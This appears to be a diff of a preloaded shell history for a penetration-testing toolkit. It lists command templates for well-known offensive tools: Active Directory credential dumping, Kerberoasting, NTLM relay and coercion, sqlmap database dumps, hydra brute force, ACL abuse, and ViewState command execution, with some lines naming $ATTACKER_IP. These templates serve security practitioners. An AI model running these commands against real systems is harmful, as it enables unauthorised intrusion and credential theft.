@@ -1,118 +1,160 @@
 : 171000000:0;hashcat --identify $HASH_FILE
-: 171000001:0;zip2john archive.zip > $HASH_FILE
-: 171000002:0;gpp-decrypt $BASE64_GPP_PASS
-: 171000003:0;ffuf -u http://$IP -H "Host:FUZZ.$DOMAIN" -w $SUB_DOMAIN_WORDLIST
-: 171000004:0;ffuf -u http://$TARGET/FUZZ -w $SUB_DIR_WORDLIST
-: 171000005:0;gobuster vhost -u http://$DOMAIN -w $SUB_DOMAIN_WORDLIST
-: 171000006:0;gobuster dir -u http://$DOMAIN -w $SUB_DIR_WORDLIST
-: 171000007:0;smbclient -L //$IP -N
-: 171000008:0;smbclient -L //$IP -U "${USER}%${PASSWORD}"
-: 171000009:0;smbclient //$IP/$SHARE -U "$USER%$PASSWORD"
-: 171000010:0;smbclient -U "$USER"%"$PASS" //"$DC_IP"/SYSVOL -c "recurse; prompt; cd $DOMAIN/Policies/; mget {*};"
-: 171000011:0;smbclientng --host $IP -u $USER -p $PASSWORD
-: 171000012:0;nxc smb $IP -u $USER -p $PASSWORD
-: 171000013:0;nxc smb $IP -u $USER -H $HASH
-: 171000014:0;nxc smb $IP -u $USER -p $PASSWORD --users
-: 171000015:0;nxc smb $IP -u $USER -p $PASSWORD --rid-brute
-: 171000016:0;nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting $TGS_OUTPUTFILE
-: 171000017:0;nxc smb $IP -u $USER -p $PASSWORD -M gpp_password
-: 171000018:0;ftp anonymous@$IP $PORT
-: 171000019:0;ldapsearch -H ldap://$IP -x -s base -b "" namingContexts
-: 171000020:0;ldapsearch -H ldap://$IP -x -b "DC=${DOMAIN_NAME},DC=${TLD}"
-: 171000021:0;ldapdomaindump -u "$DOMAIN\$USER" -p $PASSWORD -o $OUTPUT_DIR/ $IP
-: 171000022:0;rpcclient -U "${USER}%${PASSWORD}" $IP
-: 171000023:0;rpcclient -w $DOMAIN -c querydispinfo -U '%' $IP
-: 171000024:0;rpcclient -w $DOMAIN -c enumdomusers -U '%' $IP
-: 171000025:0;snmpwalk -c "public" -v1 $IP 1.3.6.1.4.1.77.1.2.25 | awk '{print $4}' | awk -F '"' '{print $2}' > users.txt
-: 171000026:0;ettercap -Tqr $PCAP_FILE
-: 171000027:0;nikto -h $URL
-: 171000028:0;nuclei -u $TARGET
-: 171000029:0;sqlmap -r $REQUEST_FILE
-: 171000030:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent
-: 171000031:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --cookie="SESSIONID=abc123; other_cookie=value"
-: 171000032:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --dbms=$DBMS --tables
-: 171000033:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --dbms=$DBMS -D $DATABASE -T $TABLE --dump
-: 171000034:0;flask-unsign --decode --cookie $COOKIE
-: 171000035:0;flask-unsign --wordlist $WORDLIST --unsign --cookie $COOKIE --no-literal-eval
-: 171000036:0;flask-unsign --sign --cookie $JSON_CONTENT --secret $SECRET
-: 171000037:0;hydra -L $USERNAME_LIST -p whatever $TARGET http-post-form "/$LOGIN_PAGE:username=^USER^&pwd=^PWD^:Invalid username" -t 30 -I  
-: 171000038:0;hydra -l $VALID_USERNAME -P $PASSWORDS_LIST $TARGET http-post-form "/$LOGIN_PAGE:username=^USER^&pwd=^PWD^:Invalid password" -t 30 -I
-: 171000039:0;hydra -l $USER -P $PASSWORDS_LIST $TARGET http-post-form "/$LOGIN_PAGE:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\:application/json:incorrect"
-: 171000040:0;ssh -L $PORT_LOCAL:127.0.0.1:$PORT_DU_SERVICE $USER@$IP
-: 171000041:0;evil-winrm -i $IP -u $USER -p $PASSWORD
-: 171000042:0;evil-winrm -i $IP -u $USER -H $NTLM_HASH
-: 171000043:0;secretsdump.py $USER:$PASSWORD@$IP -outputfile $FILE -user-status -pwd-last-set -history
-: 171000044:0;secretsdump.py -sam $SAM_FILE -system $SYSTEM_FILE LOCAL
-: 171000045:0;secretsdump.py -system $SYSTEM_FILE -security $SECURITY_FILE -ntds ntds.dit LOCAL -outputfile $OUTPUT_FILE
-: 171000046:0;getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP
-: 171000047:0;export KRB5CCNAME="$(pwd)/$TICKET_FILE"
-: 171000048:0;GetUserSPNs.py -dc-ip $IP $DOMAIN/$USER:$PASSWORD
-: 171000049:0;GetUserSPNs.py -ticket $TICKET_FILE -dc-ip $IP
-: 171000050:0;GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -outputfile $TGS_OUTPUTFILE -dc-ip $IP
-: 171000051:0;GetNPUsers.py -dc-ip $IP $DOMAIN/ -request -format hashcat -outputfile $HASH_FILE
-: 171000052:0;GetNPUsers.py -dc-ip $IP $DOMAIN/$USER:$PASSWORD -request -format hashcat -outputfile $HASH_FILE
-: 171000053:0;bloodhound-python -c All -u $USER -p $PASSWORD -d $DOMAIN -ns $IP --zip
-: 171000054:0;responder --interface $INTERFACE
-: 171000055:0;responder --interface $INTERFACE --lm --disable-ess
-: 171000056:0;certipy shadow auto -u "$USER"@"$DOMAIN" -hashes $HASH -k -account $TARGET_ACCOUNT -target $DC_NAME"."$DOMAIN
-: 171000057:0;certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $IP -vulnerable -json
-: 171000058:0;certipy find -u $USER@$DOMAIN -hashes $HASH -dc-ip $IP -vulnerable -json
-: 171000059:0;wpscan --url $URL -e u,ap
-: 171000060:0;net rpc group addmem $TARGET_GROUP $TARGET_USER -U "$DOMAIN/$CONTROLLED_USER%$PASSWORD" -S $IP
-: 171000061:0;rpcclient -U $DOMAIN"/"$USER"%"$PASSWORD $IP
-: 171000062:0;rpcclient -U $DOMAIN"/"$USER"%"$HASH --pw-nt-hash $IP
-: 171000063:0;bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
-: 171000064:0;owneredit.py -action write -new-owner $USER -target $TARGET $DOMAIN/$USER:$PASSWORD
-: 171000065:0;dacledit.py -action 'write' -rights 'FullControl' -principal $USER -target $TARGET $DOMAIN/$USER:$PASSWORD
-: 171000066:0;gMSADumper.py -u $USER -p $PASSWORD -d $DOMAIN
-: 171000067:0;targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASSWORD
-: 171000068:0;ldapsearch-ad.py -l $IP -t info
-: 171000069:0;addcomputer.py -hashes $HASH -dc-ip $DC_IP -computer-name $COMPUTER_NAME -computer-pass $COMPUTER_PASS -baseDN $DN $DOMAIN/$USER
-: 171000070:0;dpapi.py masterkey -file $KEY_FILE -sid $USER_SID -password $USER_PASSWORD
-: 171000071:0;dpapi.py credential -file $CYPHERED_BLOB -key $KEY
-: 171000072:0;donpapi collect -t $IP -d $DOMAIN -u $USER -p $PASSWORD
-: 171000073:0;faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
-: 171000074:0;networkhound_update_custom_nodes_to_bloodhound -s https://127.0.0.1 -u $USER -p $PASSWORD -m /opt/NetworkHound/model.json
-: 171000075:0;networkhound --dc $IP -d $DOMAIN -u $USER -p $PASSWORD
-: 171000076:0;chepy encoding
-: 171000077:0;pyntdsutil $DOMAIN/$USER:$PASSWORD@$DC_IP
-: 171000078:0;krbjack check --domain $DOMAIN --dc-ip $DC_IP
-: 171000079:0;gixy nginx.conf
-: 171000080:0;dploot backupkey -d $DOMAIN -u $USER -p $PASSWORD -t $DC_IP
-: 171000081:0;dploot certificates -d $DOMAIN -u $USER -p $PASSWORD -t $IP -pvk $BACKUPKEY.pvk
-: 171000082:0;dploot masterkeys -d $DOMAIN -u $USER -p $PASSWORD -t $IP -passwords $PASSWORDS_FILE
-: 171000083:0;acltoolkit $DOMAIN/$USER:$PASSWORD@$DC_IP get-objectacl -object $TARGET
-: 171000084:0;powerview $DOMAIN/$USER:$PASSWORD@$DC_IP --web
-: 171000085:0;arsenal
-: 171000086:0;coercer scan -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
-: 171000087:0;coercer coerce -l $LOCAL_IP -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
-: 171000088:0;lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGET
-: 171000089:0;username_generator -w $NAMESFILE
-: 171000090:0;routersploit
-: 171000091:0;aced $DOMAIN/$USER:$PASSWORD@$DC_IP
-: 171000092:0;pass-station search $PRODUCT
-: 171000093:0;enum4linux-ng $IP
-: 171000094:0;kerbrute userenum --dc $DC_IP -d $DOMAIN $USER_FILE
-: 171000095:0;badsecrets $SECRET
-: 171000096:0;badsecrets -c $WORDLIST $SECRET
-: 171000097:0;badsecrets $VIEWSTATE $VIEWSTATEGENERATOR
-: 171000098:0;viewgen --guess $VIEWSTATE
-: 171000099:0;viewgen -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000100:0;viewgen --check --vkey $VALIDATION_KEY --valg $ALGO -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000101:0;viewgen --check --vkey $VALIDATION_KEY --valg $VALIDATION_ALG --dkey $DECRYPTION_KEY --dalg $DECRYPTION_ALG -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000102:0;viewgen --check --webconfig $WEBCONFIG_FILE -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000103:0;viewgen -c $COMMAND --vkey $VALIDATION_KEY --valg $ALGO -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000104:0;viewgen -c $COMMAND --vkey $VALIDATION_KEY --valg $VALIDATION_ALG --dkey $DECRYPTION_KEY --dalg $DECRYPTION_ALG -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000105:0;viewgen -c $COMMAND --webconfig $WEBCONFIG_FILE -m $VIEWSTATEGENERATOR $VIEWSTATE
-: 171000106:0;cmloot $DOMAIN/$USER:$PASSWORD@IP -findsccmservers
-: 171000107:0;cmloot $DOMAIN/$USER:$PASSWORD@IP -cmlootinventory sccmfiles.txt
-: 171000108:0;cmloot $DOMAIN/$USER:$PASSWORD@IP -cmlootdownload sccmfiles.txt
-: 171000109:0;gpoParser remote -u $USER -p $PASSWORD -d $DOMAIN -s $IP
-: 171000110:0;gpoParser display
-: 171000111:0;gpoParser query
-: 171000112:0;daclsearch dump ${DOMAIN}_aces.db -d $DOMAIN --dc-ip $IP -u $USER -p $PASSWORD
-: 171000113:0;daclsearch cli ${DOMAIN}_aces.db
-: 171000114:0;pre2k auth -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $IP
-: 171000115:0;pre2k unauth -d $DOMAIN -dc-ip $IP -inputfile $TARGETFILE
-: 171000116:0;mssqlpwner $USER:$PASSWORD@$IP interactive
-: 171000117:0;mssqlpwner $USER:$PASSWORD@$IP -windows-auth interactive
+: 171000001:0;hashid $HASH
+: 171000002:0;zip2john archive.zip > $HASH_FILE
+: 171000003:0;gpp-decrypt $BASE64_GPP_PASS
+: 171000004:0;ffuf -u http://$IP -H "Host:FUZZ.$DOMAIN" -w $SUB_DOMAIN_WORDLIST
+: 171000005:0;ffuf -u http://$TARGET/FUZZ -w $SUB_DIR_WORDLIST
+: 171000006:0;gobuster vhost -u http://$DOMAIN -w $SUB_DOMAIN_WORDLIST
+: 171000007:0;gobuster dir -u http://$DOMAIN -w $SUB_DIR_WORDLIST
+: 171000008:0;smbclient -L //$IP -N
+: 171000009:0;smbclient -L //$IP -U "${USER}%${PASSWORD}"
+: 171000010:0;smbclient //$IP/$SHARE -U "$USER%$PASSWORD"
+: 171000011:0;smbclient -U "$USER"%"$PASS" //"$DC_IP"/SYSVOL -c "recurse; prompt; cd $DOMAIN/Policies/; mget {*};"
+: 171000012:0;smbclientng --host $IP -u $USER -p $PASSWORD
+: 171000013:0;nxc smb $IP -u $USER -p $PASSWORD
+: 171000014:0;nxc smb $IP -u $USER -H $HASH
+: 171000015:0;nxc smb $IP -u $USER -p $PASSWORD --users
+: 171000016:0;nxc smb $IP -u $USER -p $PASSWORD --rid-brute
+: 171000017:0;nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting $TGS_OUTPUTFILE
+: 171000018:0;nxc smb $IP -u $USER -p $PASSWORD -M gpp_password
+: 171000019:0;ftp anonymous@$IP $PORT
+: 171000020:0;ldapsearch -H ldap://$IP -x -s base -b "" namingContexts
+: 171000021:0;ldapsearch -H ldap://$IP -x -b "DC=${DOMAIN_NAME},DC=${TLD}"
+: 171000022:0;ldapdomaindump -u "$DOMAIN\$USER" -p $PASSWORD -o $OUTPUT_DIR/ $IP
+: 171000023:0;rpcclient -U "${USER}%${PASSWORD}" $IP
+: 171000024:0;rpcclient -w $DOMAIN -c querydispinfo -U '%' $IP
+: 171000025:0;rpcclient -w $DOMAIN -c enumdomusers -U '%' $IP
+: 171000026:0;snmpwalk -c "public" -v1 $IP 1.3.6.1.4.1.77.1.2.25 | awk '{print $4}' | awk -F '"' '{print $2}' > users.txt
+: 171000027:0;ettercap -Tqr $PCAP_FILE
+: 171000028:0;nikto -h $URL
+: 171000029:0;nuclei -u $TARGET
+: 171000030:0;sqlmap -r $REQUEST_FILE
+: 171000031:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent
+: 171000032:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --cookie="SESSIONID=abc123; other_cookie=value"
+: 171000033:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --dbms=$DBMS --tables
+: 171000034:0;sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --dbms=$DBMS -D $DATABASE -T $TABLE --dump
+: 171000035:0;flask-unsign --decode --cookie $COOKIE
+: 171000036:0;flask-unsign --wordlist $WORDLIST --unsign --cookie $COOKIE --no-literal-eval
+: 171000037:0;flask-unsign --sign --cookie $JSON_CONTENT --secret $SECRET
+: 171000038:0;hydra -L $USERNAME_LIST -p whatever $TARGET http-post-form "/$LOGIN_PAGE:username=^USER^&pwd=^PWD^:Invalid username" -t 30 -I  
+: 171000039:0;hydra -l $VALID_USERNAME -P $PASSWORDS_LIST $TARGET http-post-form "/$LOGIN_PAGE:username=^USER^&pwd=^PWD^:Invalid password" -t 30 -I
+: 171000040:0;hydra -l $USER -P $PASSWORDS_LIST $TARGET http-post-form "/$LOGIN_PAGE:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\:application/json:incorrect"
+: 171000041:0;ssh -L $PORT_LOCAL:127.0.0.1:$PORT_DU_SERVICE $USER@$IP
+: 171000042:0;evil-winrm -i $IP -u $USER -p $PASSWORD
+: 171000043:0;evil-winrm -i $IP -u $USER -H $NTLM_HASH
+: 171000044:0;secretsdump.py $USER:$PASSWORD@$IP -outputfile $FILE -user-status -pwd-last-set -history
+: 171000045:0;secretsdump.py -sam $SAM_FILE -system $SYSTEM_FILE LOCAL
+: 171000046:0;secretsdump.py -system $SYSTEM_FILE -security $SECURITY_FILE -ntds ntds.dit LOCAL -outputfile $OUTPUT_FILE
+: 171000047:0;getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP
+: 171000048:0;export KRB5CCNAME="$(pwd)/$TICKET_FILE"
+: 171000049:0;GetUserSPNs.py -dc-ip $IP $DOMAIN/$USER:$PASSWORD
+: 171000050:0;GetUserSPNs.py -ticket $TICKET_FILE -dc-ip $IP
+: 171000051:0;GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -outputfile $TGS_OUTPUTFILE -dc-ip $IP
+: 171000052:0;GetNPUsers.py -dc-ip $IP $DOMAIN/ -request -format hashcat -outputfile $HASH_FILE
+: 171000053:0;GetNPUsers.py -dc-ip $IP $DOMAIN/$USER:$PASSWORD -request -format hashcat -outputfile $HASH_FILE
+: 171000054:0;bloodhound-python -c All -u $USER -p $PASSWORD -d $DOMAIN -ns $IP --zip
+: 171000055:0;responder --interface $INTERFACE
+: 171000056:0;responder --interface $INTERFACE --lm --disable-ess
+: 171000057:0;certipy shadow auto -u "$USER"@"$DOMAIN" -hashes $HASH -k -account $TARGET_ACCOUNT -target $DC_NAME"."$DOMAIN
+: 171000058:0;certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $IP -vulnerable -json
+: 171000059:0;certipy find -u $USER@$DOMAIN -hashes $HASH -dc-ip $IP -vulnerable -json
+: 171000060:0;wpscan --url $URL -e u,ap
+: 171000061:0;net rpc group addmem $TARGET_GROUP $TARGET_USER -U "$DOMAIN/$CONTROLLED_USER%$PASSWORD" -S $IP
+: 171000062:0;rpcclient -U $DOMAIN"/"$USER"%"$PASSWORD $IP
+: 171000063:0;rpcclient -U $DOMAIN"/"$USER"%"$HASH --pw-nt-hash $IP
+: 171000064:0;bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
+: 171000065:0;owneredit.py -action write -new-owner $USER -target $TARGET $DOMAIN/$USER:$PASSWORD
+: 171000066:0;dacledit.py -action 'write' -rights 'FullControl' -principal $USER -target $TARGET $DOMAIN/$USER:$PASSWORD
+: 171000067:0;gMSADumper.py -u $USER -p $PASSWORD -d $DOMAIN
+: 171000068:0;targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASSWORD
+: 171000069:0;ldapsearch-ad.py -l $IP -t info
+: 171000070:0;addcomputer.py -hashes $HASH -dc-ip $DC_IP -computer-name $COMPUTER_NAME -computer-pass $COMPUTER_PASS -baseDN $DN $DOMAIN/$USER
+: 171000071:0;dpapi.py masterkey -file $KEY_FILE -sid $USER_SID -password $USER_PASSWORD
+: 171000072:0;dpapi.py credential -file $CYPHERED_BLOB -key $KEY
+: 171000073:0;donpapi collect -t $IP -d $DOMAIN -u $USER -p $PASSWORD
+: 171000074:0;faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
+: 171000075:0;networkhound_update_custom_nodes_to_bloodhound -s https://127.0.0.1 -u $USER -p $PASSWORD -m /opt/NetworkHound/model.json
+: 171000076:0;networkhound --dc $IP -d $DOMAIN -u $USER -p $PASSWORD
+: 171000077:0;chepy encoding
+: 171000078:0;pyntdsutil $DOMAIN/$USER:$PASSWORD@$DC_IP
+: 171000079:0;krbjack check --domain $DOMAIN --dc-ip $DC_IP
+: 171000080:0;gixy nginx.conf
+: 171000081:0;dploot backupkey -d $DOMAIN -u $USER -p $PASSWORD -t $DC_IP
+: 171000082:0;dploot certificates -d $DOMAIN -u $USER -p $PASSWORD -t $IP -pvk $BACKUPKEY.pvk
+: 171000083:0;dploot masterkeys -d $DOMAIN -u $USER -p $PASSWORD -t $IP -passwords $PASSWORDS_FILE
+: 171000084:0;acltoolkit $DOMAIN/$USER:$PASSWORD@$DC_IP get-objectacl -object $TARGET
+: 171000085:0;powerview $DOMAIN/$USER:$PASSWORD@$DC_IP --web
+: 171000086:0;arsenal
+: 171000087:0;coercer scan -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
+: 171000088:0;coercer coerce -l $LOCAL_IP -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
+: 171000089:0;lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGET
+: 171000090:0;username_generator -w $NAMESFILE
+: 171000091:0;routersploit
+: 171000092:0;aced $DOMAIN/$USER:$PASSWORD@$DC_IP
+: 171000093:0;pass-station search $PRODUCT
+: 171000094:0;enum4linux-ng $IP
+: 171000095:0;kerbrute userenum --dc $DC_IP -d $DOMAIN $USER_FILE
+: 171000096:0;badsecrets $SECRET
+: 171000097:0;badsecrets -c $WORDLIST $SECRET
+: 171000098:0;badsecrets $VIEWSTATE $VIEWSTATEGENERATOR
+: 171000099:0;viewgen --guess $VIEWSTATE
+: 171000100:0;viewgen -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000101:0;viewgen --check --vkey $VALIDATION_KEY --valg $ALGO -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000102:0;viewgen --check --vkey $VALIDATION_KEY --valg $VALIDATION_ALG --dkey $DECRYPTION_KEY --dalg $DECRYPTION_ALG -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000103:0;viewgen --check --webconfig $WEBCONFIG_FILE -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000104:0;viewgen -c $COMMAND --vkey $VALIDATION_KEY --valg $ALGO -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000105:0;viewgen -c $COMMAND --vkey $VALIDATION_KEY --valg $VALIDATION_ALG --dkey $DECRYPTION_KEY --dalg $DECRYPTION_ALG -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000106:0;viewgen -c $COMMAND --webconfig $WEBCONFIG_FILE -m $VIEWSTATEGENERATOR $VIEWSTATE
+: 171000107:0;cmloot $DOMAIN/$USER:$PASSWORD@IP -findsccmservers
+: 171000108:0;cmloot $DOMAIN/$USER:$PASSWORD@IP -cmlootinventory sccmfiles.txt
+: 171000109:0;cmloot $DOMAIN/$USER:$PASSWORD@IP -cmlootdownload sccmfiles.txt
+: 171000110:0;gpoParser remote -u $USER -p $PASSWORD -d $DOMAIN -s $IP
+: 171000111:0;gpoParser display
+: 171000112:0;gpoParser query
+: 171000113:0;daclsearch dump ${DOMAIN}_aces.db -d $DOMAIN --dc-ip $IP -u $USER -p $PASSWORD
+: 171000114:0;daclsearch cli ${DOMAIN}_aces.db
+: 171000115:0;pre2k auth -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $IP
+: 171000116:0;pre2k unauth -d $DOMAIN -dc-ip $IP -inputfile $TARGETFILE
+: 171000117:0;mssqlpwner $USER:$PASSWORD@$IP interactive
+: 171000118:0;mssqlpwner $USER:$PASSWORD@$IP -windows-auth interactive
+: 171000119:0;foremost -i $INPUTFILE
+: 171000120:0;testdisk
+: 171000121:0;onesixtyone -c $COMUNITIES_WORDLIST $IP
+: 171000122:0;dnsenum --noreverse -o $OUTPUT_FILE $DOMAIN
+: 171000123:0;dnsmap $DOMAIN -w $WORDLIST
+: 171000124:0;cewl -d $DEPTH -w $OUTPUT_FILE $URL
+: 171000125:0;whatweb $TARGET
+: 171000126:0;nbtscan -e $IP_RANGE
+: 171000127:0;sslscan $TARGET
+: 171000128:0;jwt-hack decode $JWT
+: 171000129:0;jwt-hack scan $JWT
+: 171000130:0;gowitness scan file -f $TARGETS_FILE --write-db
+: 171000131:0;gowitness report server
+: 171000132:0;ldapnomnom --input $USERNAME_LIST --output $OUTPUT_FILE --server $TARGET --parallel $NB_CONN
+: 171000133:0;s3scanner -provider $PROVIDER -bucket $TARGET_BUCKET
+: 171000134:0;git-dumper $TARGET_URL $OUTPUT_DIR
+: 171000135:0;abuseACL $DOMAIN/$USER:"$PASSWORD"@$TARGET
+: 171000136:0;adidnsdump $TARGET
+: 171000137:0;semgrep scan --metrics=off -f /code-analysis/semgrep-rules .
+: 171000138:0;acltoolkit $DOMAIN/$USER:$PASSWORD@$IP get-objectacl
+: 171000139:0;wafw00f $TARGET
+: 171000140:0;penelope
+: 171000141:0;sslyze $TARGET
+: 171000142:0;apachetomcatscanner -tt $TARGET -tp $PORT --list-cves
+: 171000143:0;dicozorus init
+: 171000144:0;dicozorus gen -o $WORDLIST_OUTPUT
+: 171000145:0;mycli -u $USER -P $PORT -h $TARGET $DATABASE
+: 171000146:0;unblob $FILE
+: 171000147:0;cewler -d $DEPTH -o $OUTPUT_FILE $URL
+: 171000148:0;pwncat-vl
+: 171000149:0;dnschef --fakeip $ATTACKER_IP
+: 171000150:0;ghostspn scan -u $USERNAME -p $PASSWORD -d $DOMAIN --dc-ip $IP
+: 171000151:0;noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+: 171000152:0;pyLAPS.py --action get -u $USER -d $DOMAIN -p $DOMAIN --dc-ip $DC_IP
+: 171000153:0;ntlm_theft -g all -f $FILENAME -s $ATTACKER_IP
+: 171000154:0;sccmhunter find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
+: 171000155:0;sccmhunter http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
+: 171000156:0;relayking -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP -vv --audit --protocols smb,ldap,ldaps,mssql,http,https --threads 10 -o plaintext,json --output-file $OUTPUT_FILE --proto-portscan --ntlmv1 --gen-relay-list $REALYABLE_OUTPUT
+: 171000157:0;searchsploit $SEARCH_TERM1
+: 171000158:0;searchsploit $REL_PATH -p
+: 171000159:0;odat all -s $TARGET_IP -p $PORT -U $USER -P $PASSWORD
